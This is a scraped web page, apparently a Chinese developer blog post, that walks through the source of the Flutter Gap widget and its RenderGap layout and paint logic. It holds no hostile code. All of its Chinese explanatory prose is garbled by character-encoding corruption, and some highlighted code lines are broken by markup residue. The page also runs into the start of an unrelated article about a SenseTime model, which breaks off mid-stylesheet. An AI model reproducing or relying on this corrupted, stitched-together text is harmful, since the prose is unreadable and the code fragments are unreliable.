            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1222312662146766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nicholas68
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:46:13.000Z" title="Fri Jan 30 2026 12:46:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Flutter å°éƒ¨ä»¶ï¼Œå¯è½»æ¾åœ¨ Flex å°éƒ¨ä»¶ï¼ˆå¦‚åˆ—å’Œè¡Œï¼‰æˆ–æ»šåŠ¨è§†å›¾ä¸­æ·»åŠ é—´éš™ã€‚</p>
<p><code>Gap</code>çš„æ ¸å¿ƒåŸç†æ˜¯ä½¿ç”¨<code>RenderObject</code>è‡ªå®šä¹‰å®ç°å¸ƒå±€ã€‚</p>
<h2 data-id="heading-0">Gap</h2>
<pre><code class="hljs language-scala" lang="scala">
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  const <span class="hljs-type">Gap</span>(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
  })  : assert(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; double.infinity),
        assert(crossAxisExtent == <span class="hljs-literal">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  const <span class="hljs-type">Gap</span>.expand(
    double mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-type">Color</span>? color,
  }) : <span class="hljs-keyword">this</span>(
          mainAxisExtent,
          key: key,
          crossAxisExtent: double.infinity,
          color: color,
        );

  <span class="hljs-keyword">final</span> double mainAxisExtent;

  <span class="hljs-keyword">final</span> double? crossAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span>? color;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">final</span> scrollableState = <span class="hljs-type">Scrollable</span>.maybeOf(context);
    <span class="hljs-keyword">final</span> <span class="hljs-type">AxisDirection</span>? axisDirection = scrollableState?.axisDirection;
    <span class="hljs-keyword">final</span> <span class="hljs-type">Axis</span>? fallbackDirection =
        axisDirection == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : axisDirectionToAxis(axisDirection);

    <span class="hljs-keyword">return</span> _RawGap(
      mainAxisExtent,
      crossAxisExtent: crossAxisExtent,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }
}
</code></pre>
<p>ä»æºç çœ‹, å®ƒæä¾›äº†ä¸¤ä¸ªæ„é€ æ–¹æ³•, <code>Gap</code>å’Œ<code>Gap.expand</code>æ–¹ä¾¿ç”¨æˆ·æŒ‰éœ€ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">_RawGap</h2>
<p><code>_RawGap</code>æ˜¯æ ¸å¿ƒç±», å®ƒç»§æ‰¿äº†<code>LeafRenderObjectWidget</code>.</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_RawGap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">LeafRenderObjectWidget</span> </span>{
  <span class="hljs-keyword">const</span> _RawGap(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    Key? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
    <span class="hljs-keyword">this</span>.fallbackDirection,
  })  : <span class="hljs-keyword">assert</span>(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; <span class="hljs-built_in">double</span>.infinity),
        <span class="hljs-keyword">assert</span>(crossAxisExtent == <span class="hljs-keyword">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> mainAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double?</span> crossAxisExtent;

  <span class="hljs-keyword">final</span> Color? color;

  <span class="hljs-keyword">final</span> Axis? fallbackDirection;

  <span class="hljs-meta">@override</span>
  RenderObject createRenderObject(BuildContext context) {
    <span class="hljs-keyword">return</span> RenderGap(
      mainAxisExtent: mainAxisExtent,
      crossAxisExtent: crossAxisExtent ?? <span class="hljs-number">0</span>,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> updateRenderObject(BuildContext context, RenderGap renderObject) {
    <span class="hljs-keyword">if</span> (kDebugMode) {
      debugPrint(
        <span class="hljs-string">'[Gap] updateRenderObject '</span>
        <span class="hljs-string">'mainAxisExtent=<span class="hljs-subst">$mainAxisExtent</span> '</span>
        <span class="hljs-string">'crossAxisExtent=<span class="hljs-subst">${crossAxisExtent ?? <span class="hljs-number">0</span>}</span> '</span>
        <span class="hljs-string">'color=<span class="hljs-subst">$color</span> '</span>
        <span class="hljs-string">'fallbackDirection=<span class="hljs-subst">$fallbackDirection</span>'</span>,
      );
    }
    renderObject
      ..mainAxisExtent = mainAxisExtent
      ..crossAxisExtent = crossAxisExtent ?? <span class="hljs-number">0</span>
      ..color = color
      ..fallbackDirection = fallbackDirection;
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> debugFillProperties(DiagnosticPropertiesBuilder properties) {
    <span class="hljs-keyword">super</span>.debugFillProperties(properties);
    properties.add(DoubleProperty(<span class="hljs-string">'mainAxisExtent'</span>, mainAxisExtent));
    properties.add(
        DoubleProperty(<span class="hljs-string">'crossAxisExtent'</span>, crossAxisExtent, defaultValue: <span class="hljs-number">0</span>));
    properties.add(ColorProperty(<span class="hljs-string">'color'</span>, color));
    properties.add(EnumProperty&lt;Axis&gt;(<span class="hljs-string">'fallbackDirection'</span>, fallbackDirection));
  }
}
</code></pre>
<h2 data-id="heading-2">RenderGap</h2>
<pre><code class="hljs language-scss" lang="scss">class RenderGap extends RenderBox {
  <span class="hljs-built_in">RenderGap</span>({
    required double mainAxisExtent,
    double? crossAxisExtent,
    Axis? fallbackDirection,
    Color? color,
  })  : _mainAxisExtent = mainAxisExtent,
        _crossAxisExtent = crossAxisExtent,
        _color = color,
        _fallbackDirection = fallbackDirection {
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>(
        'ğŸ†• RenderGap&lt;init&gt; '
        'mainAxisExtent=$mainAxisExtent '
        'crossAxisExtent=$crossAxisExtent '
        'color=$color '
        'fallbackDirection=$fallbackDirection',
      );
    }
  }

  double get mainAxisExtent =&gt; _mainAxisExtent;
  double _mainAxisExtent;
  set <span class="hljs-built_in">mainAxisExtent</span>(double value) {
    if (_mainAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ“ mainAxisExtent set: $_mainAxisExtent -&gt; $value');
      }
      _mainAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  double? get crossAxisExtent =&gt; _crossAxisExtent;
  double? _crossAxisExtent;
  set <span class="hljs-built_in">crossAxisExtent</span>(double? value) {
    if (_crossAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ“ crossAxisExtent set: $_crossAxisExtent -&gt; $value');
      }
      _crossAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get fallbackDirection =&gt; _fallbackDirection;
  Axis? _fallbackDirection;
  set <span class="hljs-built_in">fallbackDirection</span>(Axis? value) {
    if (_fallbackDirection != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ§­ fallbackDirection set: $_fallbackDirection -&gt; $value');
      }
      _fallbackDirection = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get _direction {
    final parentNode = parent;
    if (parentNode is RenderFlex) {
      return parentNode<span class="hljs-selector-class">.direction</span>;
    } else {
      return fallbackDirection;
    }
  }

  <span class="hljs-attribute">Color</span>? get <span class="hljs-attribute">color</span> =&gt; _color;
  <span class="hljs-attribute">Color</span>? _color;
  set <span class="hljs-attribute">color</span>(Color? value) {
    if (_color != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ color set: $_color -&gt; $value');
      }
      _color = value;
      <span class="hljs-built_in">markNeedsPaint</span>();
    }
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¹ computeMinIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”· computeMaxIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¸ computeMinIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¶ computeMaxIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  double? <span class="hljs-built_in">_computeIntrinsicExtent</span>(Axis axis, double Function() compute) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;
    if (direction == axis) {
      final result = _mainAxisExtent;
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>(
          'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
        );
      }
      return result;
    } else {
      if (_crossAxisExtent!.isFinite) {
        final result = _crossAxisExtent;
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      } else {
        final result = <span class="hljs-built_in">compute</span>();
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  Size computeDryLayout(BoxConstraints constraints) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;

    if (direction != null) {
      if (direction == Axis.horizontal) {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(mainAxisExtent, crossAxisExtent!));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ’§ computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      } else {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(crossAxisExtent!, mainAxisExtent));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ’§ computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      }
    } else {
      throw <span class="hljs-built_in">FlutterError</span>(
        'A Gap widget must be placed directly inside a Flex widget '
        'or its fallbackDirection must not be null',
      );
    }
  }

  <span class="hljs-keyword">@override</span>
  void performLayout() {
    size = <span class="hljs-built_in">computeDryLayout</span>(constraints);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ›  performLayout(constraints=$constraints) size=<span class="hljs-variable">$size</span>');
    }
  }

  <span class="hljs-keyword">@override</span>
  void paint(PaintingContext context, Offset offset) {
    if (color != null) {
      final Paint paint = <span class="hljs-built_in">Paint</span>().<span class="hljs-selector-class">.color</span> = <span class="hljs-attribute">color</span>!;
      context<span class="hljs-selector-class">.canvas</span><span class="hljs-selector-class">.drawRect</span>(offset &amp; size, paint);
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ paint(offset=$offset, size=$size, color=$color)');
      }
    } else {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ paint(offset=$offset, size=$size, color=null)');
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  void debugFillProperties(DiagnosticPropertiesBuilder properties) {
    super<span class="hljs-selector-class">.debugFillProperties</span>(properties);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ§¾ debugFillProperties()');
    }
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('mainAxisExtent', mainAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('crossAxisExtent', crossAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(ColorProperty('color', color));
    properties<span class="hljs-selector-class">.add</span>(EnumProperty&lt;Axis&gt;('fallbackDirection', fallbackDirection));
  }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61eb8d902caf49c2a2f759635a2f51f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmljaG9sYXM2OA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381973&amp;x-signature=KGBT%2B64Io3J2cBKhE36C3%2BXarsg%3D" alt="æˆªå±2026-01-30 19.30.39.png" loading="lazy"/></p>
<p>çœŸæ­£ç»˜åˆ¶åŸç†, <code>RenderGap</code>æ˜¯<code>RenderBox</code>çš„å­ç±», ä¸éœ€è¦å­ç±», ç»˜åˆ¶æ—¶, åªä¸è‡ªèº«<code>size</code>å’Œ<code>color</code>æœ‰å…³ã€‚</p>
<p><code>mainAxisExtent</code>ã€<code>crossAxisExtent</code>å±æ€§<code>set</code>æ–¹æ³•è§¦å‘å, ä¼šæ‰§è¡Œ<code>markNeedsLayout</code>, æ ‡è®°è¯¥æ¸²æŸ“å¯¹è±¡éœ€è¦é‡æ–°å¸ƒå±€, å¹¶è¯·æ±‚(<code>requestVisualUpdate</code>)è°ƒåº¦ä¸‹ä¸€å¸§æ‰§è¡Œå¸ƒå±€ã€‚</p>
<p>å¸ƒå±€é˜¶æ®µ,ä¼šæ‰§è¡Œ<code>computeDryLayout</code>ã€<code>performLayout</code>æ–¹æ³•,æ›´æ–°<code>size</code>ã€‚</p>
<p>ç»˜åˆ¶é˜¶æ®µ<code>paint</code>,åœ¨ offset &amp; size çš„çŸ©å½¢å†…å¡«å……é¢œè‰²ï¼ˆcolor ä¸º null æ—¶ä¸ç»˜åˆ¶ï¼‰ã€‚</p>
<ul>
<li>çŸ©å½¢èŒƒå›´ï¼šoffset &amp; size ç­‰ä»·äº Rect.fromLTWH(offset.dx, offset.dy, size.width, size.height)ï¼Œä¿è¯ç»˜åˆ¶ä¸¥æ ¼ä½äºæœ¬ç»„ä»¶åŒºåŸŸã€‚</li>
<li>æ— å­èŠ‚ç‚¹ä¸å›¾å±‚ï¼šRenderGap ä¸ push é¢å¤– Layerï¼Œä¹Ÿä¸ç»˜åˆ¶å­å†…å®¹ï¼›ä»…æŠŠä¸€ä¸ªçŸ©å½¢æŒ‡ä»¤æäº¤åˆ°å½“å‰ç”»å¸ƒã€‚</li>
</ul>
<p>è·Ÿ<code>markNeedsLayout</code>å¸ƒå±€é˜¶æ®µä¸åŒçš„æ˜¯, <code>markNeedsPaint</code>ç»˜åˆ¶é˜¶æ®µä¸å‚ä¸å°ºå¯¸è®¡ç®—, å®ƒåœ¨<code>size</code>ç¡®å®šåæ‰æ‰§è¡Œã€‚</p>
<p>ä¸æ ‡è®°æ–¹æ³•çš„å…³ç³»:</p>
<ul>
<li>markNeedsPaintï¼šå½“ color å˜æ›´æ—¶ç”±å±æ€§ setter è°ƒç”¨ï¼Œæ ‡è®°æœ¬èŠ‚ç‚¹éœ€è¦åœ¨ä¸‹ä¸€å¸§é‡ç»˜ï¼›ä¸ä¼šè§¦å‘å¸ƒå±€ã€‚</li>
<li>markNeedsLayoutï¼šå½“ mainAxisExtent/crossAxisExtent/fallbackDirection å˜æ›´å¼•èµ·å°ºå¯¸æˆ–æ–¹å‘å˜åŒ–æ—¶è°ƒç”¨ï¼›ä¸‹ä¸€å¸§ä¼šé‡æ–°å¸ƒå±€ï¼Œå¸ƒå±€å®Œæˆåè‹¥ç»˜åˆ¶åŒºåŸŸæˆ–å†…å®¹ä¹Ÿéœ€æ›´æ–°æ‰ä¼šå‡ºç° paintã€‚</li>
<li>æ‰§è¡Œé“¾è·¯ç¤ºä¾‹ï¼šå±æ€§å˜æ›´ â†’ æ ‡è®°ï¼ˆlayout/paintï¼‰â†’ å¸ƒå±€ï¼ˆcomputeDryLayout/performLayoutï¼‰â†’ ç»˜åˆ¶ï¼ˆpaintï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿]]></title>    <link>https://juejin.cn/post/7600868443832844307</link>    <guid>https://juejin.cn/post/7600868443832844307</guid>    <pubDate>2026-01-30T12:49:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832844307" data-draft-id="7600888960106659876" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-30T12:49:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:49:24.000Z" title="Fri Jan 30 2026 12:49:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item 